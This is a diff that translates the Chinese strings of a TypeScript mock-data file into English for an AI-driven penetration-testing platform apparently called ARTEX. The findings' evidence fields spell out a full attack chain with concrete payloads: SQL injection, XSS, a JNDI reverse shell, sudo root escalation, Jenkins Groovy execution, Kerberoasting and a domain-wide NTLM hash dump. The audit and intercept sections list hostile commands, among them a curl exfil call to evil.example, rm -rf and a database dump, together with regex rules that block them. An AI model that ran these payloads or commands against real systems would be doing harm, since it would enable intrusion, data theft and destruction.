@@ -54,9 +54,9 @@ export const tasks: Task[] = [
   {
     id: "t-acme-web",
     category_id: 1,
-    category_name: "外部评估",
-    description: "Acme 官网与后台外部渗透（acme.com）",
-    goal: "拿到 acme.com 后台管理权限，确认可读取用户敏感数据。",
+    category_name: "External assessment",
+    description: "External pentest of the Acme website and admin panel (acme.com)",
+    goal: "Gain admin panel access on acme.com and confirm that sensitive user data can be read.",
     status: "running",
     created_at: T("2026-07-24T09:12:00Z"),
     created_unix: 1785489120,
@@ -80,9 +80,9 @@ export const tasks: Task[] = [
   {
     id: "t-acme-api",
     category_id: 2,
-    category_name: "API 专项",
-    description: "api.acme.com 越权与注入测试",
-    goal: "评估 api.acme.com 订单/用户接口的越权(IDOR)与注入风险。",
+    category_name: "API testing",
+    description: "api.acme.com authorisation bypass and injection testing",
+    goal: "Assess the api.acme.com order/user endpoints for authorisation bypass (IDOR) and injection risks.",
     status: "running",
     created_at: T("2026-07-25T14:05:00Z"),
     created_unix: 1785592500,
@@ -106,9 +106,9 @@ export const tasks: Task[] = [
   {
     id: "t-shop-pay",
     category_id: 2,
-    category_name: "API 专项",
-    description: "shop.acme.com 支付与订单链路",
-    goal: "评估支付与订单接口的越权、金额篡改与竞态风险。",
+    category_name: "API testing",
+    description: "shop.acme.com payment and order flow",
+    goal: "Assess the payment and order endpoints for authorisation bypass, amount tampering and race condition risks.",
     status: "paused",
     created_at: T("2026-07-22T08:30:00Z"),
     created_unix: 1785313800,
@@ -131,9 +131,9 @@ export const tasks: Task[] = [
   {
     id: "t-vpn-edge",
     category_id: 1,
-    category_name: "外部评估",
-    description: "对外暴露面侦察（VPN / 边界服务）",
-    goal: "识别 acme.com 对外暴露的可利用边界服务。",
+    category_name: "External assessment",
+    description: "External exposure recon (VPN / perimeter services)",
+    goal: "Identify exploitable perimeter services that acme.com exposes externally.",
     status: "done",
     created_at: T("2026-07-18T08:00:00Z"),
     created_unix: 1784966400,
@@ -160,14 +160,14 @@ export const tasks: Task[] = [
 export const taskCategories: TaskCategory[] = [
   {
     id: 1,
-    name: "外部评估",
+    name: "External assessment",
     task_count: 2,
     created_at: T("2026-07-18T08:00:00Z"),
     updated_at: T("2026-07-25T08:00:00Z"),
   },
   {
     id: 2,
-    name: "API 专项",
+    name: "API testing",
     task_count: 2,
     created_at: T("2026-07-19T08:00:00Z"),
     updated_at: T("2026-07-24T08:00:00Z"),
@@ -177,17 +177,18 @@ export const taskCategories: TaskCategory[] = [
 export const taskTemplates: TaskTemplate[] = [
   {
     id: 1,
-    name: "外部 Web 渗透",
-    description: "对目标互联网暴露面开展黑盒渗透测试，覆盖站点、接口和常见管理入口。",
-    goal: "识别并验证可造成未授权访问、敏感数据泄露或服务器失陷的安全问题。",
+    name: "External web pentest",
+    description:
+      "Black-box penetration test of the target's internet-facing attack surface, covering sites, endpoints and common admin entry points.",
+    goal: "Identify and verify security issues that could lead to unauthorised access, sensitive data exposure or server compromise.",
     created_at: T("2026-07-20T08:00:00Z"),
     updated_at: T("2026-07-25T08:00:00Z"),
   },
   {
     id: 2,
-    name: "API 越权专项",
-    description: "围绕目标 API 的身份认证、对象级授权和角色边界开展专项测试。",
-    goal: "确认是否存在 IDOR、水平越权、垂直越权及批量数据访问风险。",
+    name: "API authorisation testing",
+    description: "Focused testing of the target API's authentication, object-level authorisation and role boundaries.",
+    goal: "Determine whether IDOR, horizontal or vertical privilege escalation, or bulk data access risks exist.",
     created_at: T("2026-07-19T08:00:00Z"),
     updated_at: T("2026-07-24T08:00:00Z"),
   },
@@ -245,7 +246,7 @@ export const companies: Company[] = [
     logo: "",
     asset_count: 18,
     scope: [
-      { id: 1, company_id: 1, kind: "domain", domain: "acme.com", raw: "acme.com", reason: "主域" },
+      { id: 1, company_id: 1, kind: "domain", domain: "acme.com", raw: "acme.com", reason: "Primary domain" },
       { id: 2, company_id: 1, kind: "cidr", net: "203.0.113.0/24", raw: "203.0.113.0/24" },
       { id: 3, company_id: 1, kind: "ip", net: "198.51.100.20", raw: "198.51.100.20" },
     ],
@@ -260,7 +261,7 @@ export const assets: Asset[] = [
     task_ids: [1],
     domain: "acme.com",
     root_domain: "acme.com",
-    icp: "京ICP备2021xxxx号",
+    icp: "Beijing ICP No. 2021xxxx",
     record_type: "A",
     record_value: ["203.0.113.10"],
     last_seen: T("2026-07-26T02:00:00Z"),
@@ -385,11 +386,11 @@ export const assets: Asset[] = [
     company_id: 1,
     task_ids: [1],
     url: "https://www.acme.com",
-    app_name: "Acme 官网",
+    app_name: "Acme website",
     category: "corp",
     status_code: 200,
     content_length: 48213,
-    page_title: "Acme Corp — 企业官网",
+    page_title: "Acme Corp | Official website",
     technologies: ["Nginx", "React", "Cloudflare"],
     favicon_mmh3: "-1580860059",
     last_seen: T("2026-07-26T02:08:00Z"),
@@ -400,11 +401,11 @@ export const assets: Asset[] = [
     company_id: 1,
     task_ids: [1],
     url: "https://admin.acme.com",
-    app_name: "后台管理",
+    app_name: "Admin console",
     category: "admin",
     status_code: 200,
     content_length: 12044,
-    page_title: "Acme Admin 登录",
+    page_title: "Acme Admin Login",
     technologies: ["Nginx", "Vue", "Element-UI"],
     last_seen: T("2026-07-26T02:09:00Z"),
   },
@@ -468,7 +469,7 @@ export const assets: Asset[] = [
     params: [{ name: "q", in: "query" }],
     last_seen: T("2026-07-26T02:14:00Z"),
   },
-  // 内网资产（DMZ→内网横向发现）
+  // Internal network assets (discovered laterally from the DMZ)
   {
     id: 19,
     type: "ip",
@@ -544,7 +545,7 @@ export const assets: Asset[] = [
     company_id: 1,
     task_ids: [1],
     url: "http://10.10.10.20:8080",
-    app_name: "Jenkins (内部)",
+    app_name: "Jenkins (internal)",
     category: "ci",
     status_code: 200,
     content_length: 14200,
@@ -569,9 +570,9 @@ export const assetCounts: Record<string, number> = assets.reduce<Record<string, 
   return m;
 }, {});
 
-// assetRef 把资产 id 变成 finding 上挂的资产引用(label 与后端 coverageNodeLabel
-// 的取值顺序一致:URL > 域名 > IP > 应用名)。「按资产」视图的树就是靠这些引用
-// 把发现挂到资产上的。
+// assetRef turns an asset id into the asset reference attached to a finding (label uses
+// the same precedence as the backend's coverageNodeLabel: URL > domain > IP > app name). The
+// "By asset" view's tree relies on these references to attach findings to assets.
 function assetRef(id: number): FindingAsset {
   const asset = assets.find((candidate) => candidate.id === id);
   if (!asset) throw new Error(`mock assetRef: unknown asset ${id}`);
@@ -597,7 +598,7 @@ export const findings: Finding[] = [
     evidence: "GET /search?q=1' AND 1=CONVERT(int,@@version)-- → 返回 MSSQL 版本报错，可读库结构。",
     intent_id: "i-2",
     task_id: "t-acme-web",
-    task_description: "Acme 官网与后台外部渗透",
+    task_description: "External pentest of the Acme website and admin panel",
     ts: T("2026-07-26T01:20:00Z"),
   },
   {
@@ -610,7 +611,7 @@ export const findings: Finding[] = [
     evidence: "将 id=1001 改为 id=1002 返回他人订单（含收货地址、手机号），无归属校验。",
     intent_id: "i-5",
     task_id: "t-acme-api",
-    task_description: "api.acme.com 越权与注入测试",
+    task_description: "api.acme.com authorisation bypass and injection testing",
     ts: T("2026-07-26T02:44:00Z"),
   },
   {
@@ -622,7 +623,7 @@ export const findings: Finding[] = [
     summary: "API JWT 使用弱密钥、可离线爆破伪造",
     evidence: "HS256，密钥 'secret'，john 5 秒破解 → 可伪造任意 sub 越权。",
     task_id: "t-acme-api",
-    task_description: "api.acme.com 越权与注入测试",
+    task_description: "api.acme.com authorisation bypass and injection testing",
     ts: T("2026-07-26T03:02:00Z"),
   },
   {
@@ -634,7 +635,7 @@ export const findings: Finding[] = [
     summary: "搜索页对 q 参数未转义，反射型 XSS",
     evidence: "q=<script>alert(document.domain)</script> 原样回显于结果标题。",
     task_id: "t-acme-web",
-    task_description: "Acme 官网与后台外部渗透",
+    task_description: "External pentest of the Acme website and admin panel",
     ts: T("2026-07-25T22:10:00Z"),
   },
   {
@@ -646,7 +647,7 @@ export const findings: Finding[] = [
     summary: "www.acme.com 暴露 .git 目录，可还原源码",
     evidence: "GET /.git/HEAD → 200；git-dumper 还原出后端源码与数据库连接串注释。",
     task_id: "t-acme-web",
-    task_description: "Acme 官网与后台外部渗透",
+    task_description: "External pentest of the Acme website and admin panel",
     ts: T("2026-07-25T20:30:00Z"),
   },
   {
@@ -659,7 +660,7 @@ export const findings: Finding[] = [
     evidence: "登录成功，进入管理后台，可管理用户与订单。",
     intent_id: "i-3",
     task_id: "t-acme-web",
-    task_description: "Acme 官网与后台外部渗透",
+    task_description: "External pentest of the Acme website and admin panel",
     ts: T("2026-07-26T03:50:00Z"),
   },
   {
@@ -671,7 +672,7 @@ export const findings: Finding[] = [
     summary: "登录后 next 参数任意跳转",
     evidence: "/login?next=https://evil.example 登录后 302 跳到外站。",
     task_id: "t-acme-web",
-    task_description: "Acme 官网与后台外部渗透",
+    task_description: "External pentest of the Acme website and admin panel",
     ts: T("2026-07-25T19:12:00Z"),
   },
   {
@@ -683,7 +684,7 @@ export const findings: Finding[] = [
     summary: "登录接口无速率限制，可暴力破解",
     evidence: "1000 次/分钟无锁定，无验证码。",
     task_id: "t-acme-web",
-    task_description: "Acme 官网与后台外部渗透",
+    task_description: "External pentest of the Acme website and admin panel",
     ts: T("2026-07-25T18:40:00Z"),
   },
   {
@@ -695,7 +696,7 @@ export const findings: Finding[] = [
     summary: "API 500 返回堆栈，泄露路径与框架版本",
     evidence: "触发 500 返回 Node.js 堆栈，泄露绝对路径与依赖版本。",
     task_id: "t-acme-api",
-    task_description: "api.acme.com 越权与注入测试",
+    task_description: "api.acme.com authorisation bypass and injection testing",
     ts: T("2026-07-25T23:05:00Z"),
   },
   {
@@ -707,7 +708,7 @@ export const findings: Finding[] = [
     summary: "shop 使用存在已知 RCE 的老版本组件",
     evidence: "指纹识别到组件 v2.3.1，对应 CVE-2024-xxxx 反序列化 RCE。",
     task_id: "t-shop-pay",
-    task_description: "shop.acme.com 支付与订单链路",
+    task_description: "shop.acme.com payment and order flow",
     ts: T("2026-07-23T15:00:00Z"),
   },
   // ── 外网→内网纵深链路上的高危发现（active task）──
@@ -720,7 +721,7 @@ export const findings: Finding[] = [
     evidence: "git-dumper 还原 www.acme.com/.git 得到 config.php，内含明文 DB 口令，后续被证实可在内网复用。",
     intent_id: "ig",
     task_id: "t-acme-web",
-    task_description: "Acme 官网与后台外部渗透",
+    task_description: "External pentest of the Acme website and admin panel",
     ts: T("2026-07-25T20:36:00Z"),
   },
   {
@@ -737,7 +738,7 @@ export const findings: Finding[] = [
       "POST /api/import 提交 JNDI payload（@type:JdbcRowSetImpl）→ 回连 dnslog 并落地反弹 shell（www-data@dmz-web01）。",
     intent_id: "i7",
     task_id: "t-acme-web",
-    task_description: "Acme 官网与后台外部渗透",
+    task_description: "External pentest of the Acme website and admin panel",
     ts: T("2026-07-25T15:40:00Z"),
   },
   {
@@ -751,7 +752,7 @@ export const findings: Finding[] = [
       "sudo -l 显示 (ALL) NOPASSWD: /usr/bin/python3 → sudo python3 -c 'os.setuid(0);os.system(\"/bin/sh\")' 直接拿 root。",
     intent_id: "i8",
     task_id: "t-acme-web",
-    task_description: "Acme 官网与后台外部渗透",
+    task_description: "External pentest of the Acme website and admin panel",
     ts: T("2026-07-25T16:20:00Z"),
   },
   {
@@ -764,7 +765,7 @@ export const findings: Finding[] = [
     evidence: "dmz-web01 第二网卡在 10.10.10.0/24，可从 DMZ 直达域控/文件服务器/Jenkins，越过网络分区。",
     intent_id: "i9",
     task_id: "t-acme-web",
-    task_description: "Acme 官网与后台外部渗透",
+    task_description: "External pentest of the Acme website and admin panel",
     ts: T("2026-07-25T21:00:00Z"),
   },
   {
@@ -778,7 +779,7 @@ export const findings: Finding[] = [
       "GET /script 无需登录即可执行 Groovy：'whoami'.execute().text → SYSTEM；并从凭据库导出域账号 acme\\svc_deploy。",
     intent_id: "i11",
     task_id: "t-acme-web",
-    task_description: "Acme 官网与后台外部渗透",
+    task_description: "External pentest of the Acme website and admin panel",
     ts: T("2026-07-25T21:50:00Z"),
   },
   {
@@ -791,7 +792,7 @@ export const findings: Finding[] = [
     evidence: "GetUserSPNs 请求 svc_sql 的 TGS，hashcat -m 13100 离线破出 Sql@2020，该账号属于 SQL 管理组。",
     intent_id: "i12",
     task_id: "t-acme-web",
-    task_description: "Acme 官网与后台外部渗透",
+    task_description: "External pentest of the Acme website and admin panel",
     ts: T("2026-07-25T23:20:00Z"),
   },
   {
@@ -808,7 +809,7 @@ export const findings: Finding[] = [
       "svc_deploy 属于 Domain Admins，psexec.py 以其登录 DC01 得 SYSTEM，secretsdump 导出全域 NTLM 哈希（含 krbtgt），完成靶标控制。",
     intent_id: "i13",
     task_id: "t-acme-web",
-    task_description: "Acme 官网与后台外部渗透",
+    task_description: "External pentest of the Acme website and admin panel",
     ts: T("2026-07-26T00:20:00Z"),
   },
 ];
@@ -2921,7 +2922,7 @@ Content-Length: 655
   "order_id": 1002,
   "user_id": 77,
   "amount": 1299.00,
-  "address": "北京市朝阳区 ****",
+  "address": "**** Collins St, Melbourne",
   "phone": "138****6021",
   "items": [{ "sku": "A-100", "qty": 1 }]
 }`,
@@ -2947,7 +2948,7 @@ export const audit: Audit = {
       ts: T("2026-07-26T02:10:00Z"),
       tool: "bash",
       action: "block",
-      reason: "目标越界：out.evil.example 不在 scope 内",
+      reason: "Target out of bounds: out.evil.example is not in scope",
       command: "curl https://out.evil.example/exfil",
     },
     {
@@ -2960,7 +2961,7 @@ export const audit: Audit = {
       ts: T("2026-07-25T21:00:00Z"),
       tool: "bash",
       action: "block",
-      reason: "破坏性命令门控：rm -rf 被拒绝",
+      reason: "Destructive command gate: rm -rf denied",
       command: "rm -rf /var/www",
     },
     {
@@ -2992,14 +2993,14 @@ export const audit: Audit = {
       ts: T("2026-07-26T00:05:00Z"),
       tool: "bash",
       action: "block",
-      reason: "数据外泄门控：secretsdump 需人工审批",
+      reason: "Data exfiltration gate: secretsdump requires manual approval",
       command: "impacket-secretsdump acme.local/svc_deploy@10.10.10.10 -just-dc",
     },
     {
       ts: T("2026-07-26T00:06:00Z"),
       tool: "bash",
       action: "allow",
-      command: "impacket-secretsdump acme.local/svc_deploy@10.10.10.10 -just-dc  # 已审批放行",
+      command: "impacket-secretsdump acme.local/svc_deploy@10.10.10.10 -just-dc  # approved and allowed",
     },
   ],
 };
@@ -3020,7 +3021,7 @@ export const llmProfiles: LLMProfile[] = [
     is_default: true,
     priority: 0,
     pool_exclude: false,
-    // anthropic 的字段名固定，故 max_tokens_field 恒为空。
+    // anthropic's field name is fixed, so max_tokens_field is always empty.
     max_tokens: 0,
     max_tokens_field: "",
   },
@@ -3039,7 +3040,7 @@ export const llmProfiles: LLMProfile[] = [
     is_default: false,
     priority: 10,
     pool_exclude: false,
-    // openai 格式 + 推理模型：上限走 max_completion_tokens。
+    // openai format + reasoning model: the limit goes in max_completion_tokens.
     max_tokens: 8192,
     max_tokens_field: "max_completion_tokens",
   },
@@ -3064,11 +3065,11 @@ export const agents: Agent[] = [
   {
     id: "1001",
     key: "retester",
-    name: "漏洞复测",
+    name: "Vulnerability retest",
     role: "assistant",
     builtin: false,
     enabled: true,
-    description: "从漏洞详情手动启动，保存独立复测结论",
+    description: "Started manually from a vulnerability's details; saves an independent retest verdict",
     max_turns: 0,
     mcp_count: 0,
     skill_count: 0,
@@ -3077,11 +3078,11 @@ export const agents: Agent[] = [
   {
     id: "1",
     key: "goals",
-    name: "目标拆解器",
+    name: "Goal decomposer",
     role: "goals",
     builtin: true,
     enabled: true,
-    description: "把任务目标拆成可探索的子目标",
+    description: "Breaks the task goal down into explorable sub-goals",
     max_turns: 8,
     mcp_count: 0,
     skill_count: 1,
@@ -3090,11 +3091,11 @@ export const agents: Agent[] = [
   {
     id: "2",
     key: "planner",
-    name: "规划者",
+    name: "Planner",
     role: "planner",
     builtin: true,
     enabled: true,
-    description: "读探索路线、判断目标达成、生成意图",
+    description: "Reads exploration routes, judges whether goals are met and generates intents",
     max_turns: 0,
     mcp_count: 1,
     skill_count: 2,
@@ -3103,11 +3104,11 @@ export const agents: Agent[] = [
   {
     id: "3",
     key: "mainagent",
-    name: "主 Agent",
+    name: "Main Agent",
     role: "mainagent",
     builtin: true,
     enabled: true,
-    description: "人在环路对话，注入 hint / 高优意图",
+    description: "Human-in-the-loop chat; injects hints / high-priority intents",
     max_turns: 0,
     web_search: true,
     mcp_count: 2,
@@ -3121,7 +3122,7 @@ export const agents: Agent[] = [
     role: "worker",
     builtin: true,
     enabled: true,
-    description: "claim 意图 → 跑 Kali 工具 → 图写回",
+    description: "Claims an intent → runs Kali tools → writes back to the graph",
     max_turns: 40,
     run_seconds: 1800,
     web_search: false,
@@ -3133,11 +3134,11 @@ export const agents: Agent[] = [
   {
     id: "5",
     key: "recon-bot",
-    name: "侦察机器人（自定义）",
+    name: "Recon bot (custom)",
     role: "custom",
     builtin: false,
     enabled: true,
-    description: "定时对新资产做被动侦察",
+    description: "Runs scheduled passive recon on new assets",
     max_turns: 12,
     mcp_count: 1,
     skill_count: 1,
@@ -3146,30 +3147,51 @@ export const agents: Agent[] = [
 ];
 
 const promptVars: PromptVar[] = [
-  { name: "Goal", description: "当前任务目标", example: "拿到 acme.com 后台管理权限", source: "runtime" },
-  { name: "AssetSummary", description: "资产图概览", example: "6 子域 / 3 IP / 4 应用 / 4 端点", source: "distilled" },
-  { name: "RouteHint", description: "探索路线提示", example: "优先后台与 API 越权面", source: "exploration" },
+  { name: "Goal", description: "Current task goal", example: "Gain admin panel access on acme.com", source: "runtime" },
+  {
+    name: "AssetSummary",
+    description: "Asset graph overview",
+    example: "6 subdomains / 3 IPs / 4 apps / 4 endpoints",
+    source: "distilled",
+  },
+  {
+    name: "RouteHint",
+    description: "Exploration route hint",
+    example: "Prioritise the admin panel and the API authorisation surface",
+    source: "exploration",
+  },
 ];
 
 const promptVersions: PromptVersion[] = [
-  { version: 3, ts: T("2026-07-25T10:00:00Z"), note: "加强越权探测引导", template_text: "你是 ARTEX 的规划者……" },
-  { version: 2, ts: T("2026-07-20T10:00:00Z"), note: "初版微调", template_text: "你是 ARTEX 的规划者(v2)……" },
+  {
+    version: 3,
+    ts: T("2026-07-25T10:00:00Z"),
+    note: "Stronger guidance for authorisation bypass probing",
+    template_text: "You are the ARTEX planner...",
+  },
+  {
+    version: 2,
+    ts: T("2026-07-20T10:00:00Z"),
+    note: "Minor tweaks to the first version",
+    template_text: "You are the ARTEX planner (v2)...",
+  },
 ];
 
 export function agentDetail(key: string): AgentDetail {
   const a = agents.find((x) => x.key === key) ?? agents[1];
   return {
     agent: a,
-    prompt: `你是 ARTEX 的「${a.name}」。\n目标：{{.Goal}}\n资产概览：{{.AssetSummary}}\n路线提示：{{.RouteHint}}\n请基于以上信息推进探索，并通过工具把结果写回图。`,
+    prompt: `You are "${a.name}" in ARTEX.\nGoal: {{.Goal}}\nAsset overview: {{.AssetSummary}}\nRoute hint: {{.RouteHint}}\nUse the information above to advance the exploration, and write the results back to the graph through tools.`,
     variables: promptVars,
     versions: promptVersions,
     visibility: { mcp: [1, 2], skill: ["api-recon", "playwright-cli"] },
     wrapup_prompt: "",
-    wrapup_default: "时间/步数将尽，请总结已确认发现并标记意图终态。",
+    wrapup_default:
+      "Time/steps are nearly used up; summarise the confirmed findings and mark the intent's final state.",
     wrapup_max_turns: 0,
     wrapup_max_turns_default: 3,
     task_timeout_wrapup_supported: a.key === "worker" || a.key === "planner",
-    task_timeout_wrapup_default: "任务超时，请立即收尾并落库当前结论。",
+    task_timeout_wrapup_default: "The task has timed out; wrap up now and save the current conclusions.",
     task_timeout_wrapup_max_turns_default: 2,
   };
 }
@@ -3200,14 +3222,14 @@ export const mcpServers: MCPServer[] = [
 
 export const mcpToolsById: Record<number, MCPTool[]> = {
   1: [
-    { name: "host_info", description: "查询某 IP 的 Shodan 主机信息" },
-    { name: "search", description: "Shodan 搜索" },
-    { name: "dns_resolve", description: "DNS 解析" },
+    { name: "host_info", description: "Look up Shodan host information for an IP" },
+    { name: "search", description: "Shodan search" },
+    { name: "dns_resolve", description: "DNS resolution" },
   ],
   2: [
-    { name: "browser_navigate", description: "浏览器打开 URL" },
-    { name: "browser_click", description: "点击元素" },
-    { name: "browser_snapshot", description: "抓取可访问性快照" },
+    { name: "browser_navigate", description: "Open a URL in the browser" },
+    { name: "browser_click", description: "Click an element" },
+    { name: "browser_snapshot", description: "Capture an accessibility snapshot" },
   ],
 };
 
@@ -3215,7 +3237,8 @@ export const mcpToolsById: Record<number, MCPTool[]> = {
 export const skills: SkillItem[] = [
   {
     name: "api-recon",
-    description: "对 REST/GraphQL API 做侦察与越权面枚举；发现新 API 端点时使用。",
+    description:
+      "Recon and authorisation surface enumeration for REST/GraphQL APIs; use when new API endpoints are found.",
     license: "MIT",
     mcps: [],
     files: ["SKILL.md", "scripts/enum.py"],
@@ -3226,7 +3249,8 @@ export const skills: SkillItem[] = [
   },
   {
     name: "playwright-cli",
-    description: "用 Playwright 驱动浏览器做动态爬取与截图；需要渲染 JS 站点时使用。",
+    description:
+      "Drives a browser with Playwright for dynamic crawling and screenshots; use when a site needs JS rendering.",
     mcps: ["playwright"],
     files: ["SKILL.md"],
     calls: 7,
@@ -3236,7 +3260,8 @@ export const skills: SkillItem[] = [
   },
   {
     name: "scopesentry",
-    description: "从 ScopeSentry 拉取资产并归并到公司范围；批量导入资产时使用。",
+    description:
+      "Pulls assets from ScopeSentry and merges them into the company scope; use when bulk-importing assets.",
     files: ["SKILL.md", "assets/mapping.md"],
     calls: 0,
     tasks: 0,
@@ -3259,7 +3284,7 @@ export const tools: Tool[] = [
   {
     key: "bash",
     system: true,
-    description: "在 Kali 环境执行 shell 命令（受 scope/破坏性门控）",
+    description: "Run a shell command in the Kali environment (subject to the scope and destructive-command gates)",
     schema: { type: "object", properties: { command: { type: "string" } }, required: ["command"] },
     agents: ["worker", "mainagent"],
     enabled: true,
@@ -3269,7 +3294,7 @@ export const tools: Tool[] = [
   {
     key: "report_finding",
     system: true,
-    description: "上报一个安全发现并连到相关节点",
+    description: "Report a security finding and link it to related nodes",
     schema: {
       type: "object",
       properties: {
@@ -3288,7 +3313,7 @@ export const tools: Tool[] = [
   {
     key: "upsert_asset",
     system: true,
-    description: "写入/更新资产节点",
+    description: "Create or update an asset node",
     schema: { type: "object", properties: { type: { type: "string" }, value: { type: "string" } } },
     agents: ["worker"],
     enabled: true,
@@ -3298,7 +3323,7 @@ export const tools: Tool[] = [
   {
     key: "list_goals",
     system: true,
-    description: "列出当前任务的目标与达成状态",
+    description: "List the current task's goals and whether they are met",
     schema: { type: "object", properties: {} },
     agents: ["planner"],
     enabled: true,
@@ -3308,7 +3333,7 @@ export const tools: Tool[] = [
   {
     key: "nuclei_scan",
     system: false,
-    description: "自定义：用 nuclei 跑指定模板",
+    description: "Custom: run a given template with nuclei",
     schema: {
       type: "object",
       properties: { target: { type: "string" }, template: { type: "string" } },
@@ -3340,8 +3365,8 @@ export const settings: Settings = {
   noa_compaction: false,
 };
 
-// ── LLM 轮询（故障转移）──────────────────────────────────────────────────────
-// demo：激活配置正常，备用配置刚因余额不足熔断，正在冷却。
+// ── LLM pool (failover) ──────────────────────────────────────────────────────
+// demo: the active profile is healthy; the backup profile just tripped the circuit breaker on insufficient balance and is cooling down.
 export const llmPool: LLMPoolStatus = {
   enabled: true,
   bind_fallback: false,
@@ -3381,14 +3406,14 @@ export const llmPool: LLMPoolStatus = {
 export const interceptRules: InterceptRule[] = [
   {
     id: 1,
-    name: "破坏性命令需审批",
+    name: "Destructive commands need approval",
     enabled: true,
     priority: 10,
     match_target: "tool_input",
     match_type: "regex",
     pattern: "rm\\s+-rf|mkfs|dd\\s+if=",
     action: "ask",
-    message: "检测到破坏性命令，需人工审批",
+    message: "Destructive command detected; manual approval required",
     timeout_enabled: true,
     timeout_seconds: 120,
     timeout_action: "deny",
@@ -3397,14 +3422,14 @@ export const interceptRules: InterceptRule[] = [
   },
   {
     id: 2,
-    name: "外发流量直接拒绝",
+    name: "Deny outbound traffic",
     enabled: true,
     priority: 20,
     match_target: "tool_input",
     match_type: "string",
     pattern: "exfil",
     action: "deny",
-    message: "疑似外发数据",
+    message: "Suspected data exfiltration",
     timeout_enabled: false,
     timeout_seconds: 0,
     timeout_action: "deny",
@@ -3422,7 +3447,7 @@ export const interceptPending: InterceptPending[] = [
     tool_name: "bash",
     tool_input: { command: "mysqldump -h 203.0.113.10 -uroot acme_prod > /tmp/dump.sql" },
     status: "pending",
-    reason: "数据外泄门控：整库导出需人工审批",
+    reason: "Data exfiltration gate: full database dump requires manual approval",
     created_at: T("2026-07-26T03:58:00Z"),
   },
 ];
@@ -3436,12 +3461,12 @@ export const interceptHistory: InterceptApprovalRow[] = [
     tool_name: "bash",
     tool_input: { command: "dd if=/dev/zero of=/tmp/x" },
     status: "denied",
-    reason: "破坏性命令需审批",
+    reason: "Destructive commands need approval",
     created_at: T("2026-07-25T20:00:00Z"),
     decided_at: T("2026-07-25T20:01:00Z"),
     conv_title: "",
     conv_agent_key: "",
-    rule_name: "破坏性命令需审批",
+    rule_name: "Destructive commands need approval",
   },
   {
     id: 91,
@@ -3450,7 +3475,7 @@ export const interceptHistory: InterceptApprovalRow[] = [
     tool_name: "bash",
     tool_input: { command: "rm -rf /var/www/html" },
     status: "denied",
-    reason: "[模型] 删除目标生产文件(D4)",
+    reason: "[Model] Deletes production files on the target (D4)",
     created_at: T("2026-07-25T18:00:00Z"),
     decided_at: T("2026-07-25T18:00:05Z"),
     conv_title: "",
@@ -3465,12 +3490,12 @@ export const interceptHistory: InterceptApprovalRow[] = [
     tool_name: "bash",
     tool_input: { command: "impacket-secretsdump acme.local/svc_deploy@10.10.10.10 -just-dc" },
     status: "allowed",
-    reason: "外发流量直接拒绝",
+    reason: "Deny outbound traffic",
     created_at: T("2026-07-26T00:05:00Z"),
     decided_at: T("2026-07-26T00:06:00Z"),
     conv_title: "",
     conv_agent_key: "",
-    rule_name: "外发流量直接拒绝",
+    rule_name: "Deny outbound traffic",
   },
   {
     id: 93,
@@ -3479,7 +3504,7 @@ export const interceptHistory: InterceptApprovalRow[] = [
     tool_name: "bash",
     tool_input: { command: 'mysql -e "DROP TABLE users_bak_0921"' },
     status: "pending",
-    reason: "[模型] 疑似备份表,无法确定是否生产数据",
+    reason: "[Model] Looks like a backup table; cannot tell whether it holds production data",
     created_at: T("2026-07-25T15:14:00Z"),
     conv_title: "",
     conv_agent_key: "",
@@ -3493,10 +3518,14 @@ interceptHistory.unshift({
   task_id: "t-acme-web",
   agent_name: "work#1",
   tool_name: "Write",
-  tool_input: { path: "reports/summary.md", content: "# 检查摘要\n\n本轮验证已完成，整理已有证据与后续建议。" },
+  tool_input: {
+    path: "reports/summary.md",
+    content:
+      "# Check summary\n\nThis round of verification is complete; the existing evidence and follow-up recommendations are summarised.",
+  },
   status: "allowed",
   decision_source: "model",
-  reason: "[模型] 将已有检查结论写入本地报告，不修改业务数据。",
+  reason: "[Model] Writes the existing check conclusions to a local report without modifying business data.",
   created_at: T("2026-07-26T08:00:00Z"),
   decided_at: T("2026-07-26T08:00:02Z"),
   conv_title: "",
@@ -3510,9 +3539,10 @@ export const interceptDetails: Record<number, InterceptAudit> = {
     tool_use_id: "call-write-report",
     correlation: "exact",
     input_digest: "a3b458eca3b458eca3b458eca3b458eca3b458eca3b458eca3b458eca3b458ec1234",
-    user_message: "请整理已经完成的检查，将结论和证据索引写入 reports/summary.md。\n保留待验证项，不修改业务数据。",
+    user_message:
+      "Please organise the completed checks and write the conclusions and evidence index to reports/summary.md.\nKeep the items still to be verified, and do not modify business data.",
     context: [
-      { kind: "user", text: "汇总本轮已有证据，生成检查摘要。" },
+      { kind: "user", text: "Summarise this round's existing evidence into a check summary." },
       {
         kind: "tool_use",
         tool: "Read",
@@ -3523,17 +3553,17 @@ export const interceptDetails: Record<number, InterceptAudit> = {
         kind: "tool_result",
         tool: "Read",
         tool_use_id: "call-read-evidence",
-        text: "已读取 3 条证据索引。\n记录包含请求时间、结果摘要和本地文件位置。",
+        text: "Read 3 evidence index entries.\nEach record includes the request time, a result summary and the local file location.",
       },
     ],
     captured_at: T("2026-07-26T08:00:00Z"),
     initial_action: "allow",
-    initial_reason: "[模型] 将已有检查结论写入本地报告，不修改业务数据。",
+    initial_reason: "[Model] Writes the existing check conclusions to a local report without modifying business data.",
     effective_action: "allow",
     config_digest: "b4c569fdb4c569fdb4c569fdb4c569fdb4c569fdb4c569fdb4c569fdb4c569fd1234",
     profile_id: 1,
     execution_status: "succeeded",
-    output: "Successfully wrote reports/summary.md\n共写入 68 个字符。",
+    output: "Successfully wrote reports/summary.md\nWrote 68 characters in total.",
     execution_ended_at: T("2026-07-26T08:00:03Z"),
   },
   93: {
@@ -3541,11 +3571,11 @@ export const interceptDetails: Record<number, InterceptAudit> = {
     tool_use_id: "call-pending-review",
     correlation: "exact",
     input_digest: "c5d670aec5d670aec5d670aec5d670aec5d670aec5d670aec5d670aec5d670ae1234",
-    user_message: "检查备份表的用途，涉及删除时需要先确认。",
+    user_message: "Check what the backup table is used for; confirm before anything that involves deleting it.",
     context: [],
     captured_at: T("2026-07-25T15:14:00Z"),
     initial_action: "ask",
-    initial_reason: "[模型] 疑似备份表，无法确定是否生产数据。",
+    initial_reason: "[Model] Looks like a backup table; cannot tell whether it holds production data.",
     profile_id: 1,
     execution_status: "not_started",
   },
@@ -3794,7 +3824,7 @@ export const conversationMessages: Record<number, Activity[]> = {
   ],
 };
 
-// ── 资产测试覆盖度（/tasks/{id}/coverage）──
+// ── Asset test coverage (/tasks/{id}/coverage) ──
 export const coverage = {
   enabled: true,
   scope_rows: 4,
@@ -3809,7 +3839,7 @@ export const coverage = {
   ],
 };
 
